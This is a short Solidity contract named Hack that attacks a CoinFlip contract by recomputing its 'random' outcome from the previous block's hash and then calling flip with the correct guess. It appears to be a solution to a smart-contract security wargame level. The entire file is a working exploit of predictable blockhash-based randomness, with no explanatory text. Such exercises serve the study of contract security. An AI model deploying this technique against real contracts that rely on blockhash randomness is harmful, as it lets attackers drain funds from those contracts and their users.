// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface CoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract Hack{
    CoinFlip coin_flip;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address addr)  {
       coin_flip = CoinFlip(addr);
    }
    function hack() public {
    uint256 blockValue = uint256(blockhash(block.number-1));
    uint256 coinFlip = blockValue/FACTOR;
    bool side = coinFlip == 1 ? true : false ;
    coin_flip.flip(side);
    }

}
